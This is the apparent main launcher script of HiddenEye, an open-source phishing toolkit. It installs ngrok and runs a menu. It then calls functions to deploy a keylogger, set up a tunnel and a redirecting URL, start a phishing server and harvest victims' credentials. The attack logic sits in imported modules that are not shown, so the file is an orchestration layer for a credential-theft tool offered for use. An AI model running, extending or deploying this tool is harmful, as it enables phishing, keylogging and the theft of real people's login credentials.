#!/usr/bin/python3
#
# HiddenEye by Open Source Community
#
import multiprocessing
import gettext
from os import system, environ
import sys
import ssl

from Defs.Checks import ConnectionManager, PermissionsManager
from Defs.Configurations import ConfigurationManager
from Defs.Actions import ActionsManager, EssentialsManager, ServerManager
# from Defs.Languages import * #TODO LANGUAGE WILL BE IMPLEMENTED LATER


RED, WHITE, CYAN, GREEN, DEFAULT = '\033[91m', '\033[46m', '\033[36m', '\033[1;32m',  '\033[0m'
PermissionsManager.checkPermissions()
ConnectionManager.verifyNetHunterConnection()
ConnectionManager.confirmConnection()
ServerManager.installNgrok()
ConfigurationManager.confirmSettingsExistence()
ConfigurationManager.readConfig()


if __name__ == "__main__":
    try:
        ActionsManager.runMainMenu()
        EssentialsManager.mainMenu()

        ActionsManager.deployKeylogger()
        ActionsManager.deployCloudfare()
        ActionsManager.insertRedirectingURL()
        port = ActionsManager.selectPort()

        ServerManager.runServer(port)
        ServerManager.selectServer(port)

        multiprocessing.Process(
            target=ServerManager.runServer(port), args=(port,)).start()
        ActionsManager.getCredentials(port)

    except KeyboardInterrupt:
        EssentialsManager.endMessage()
        exit(0)
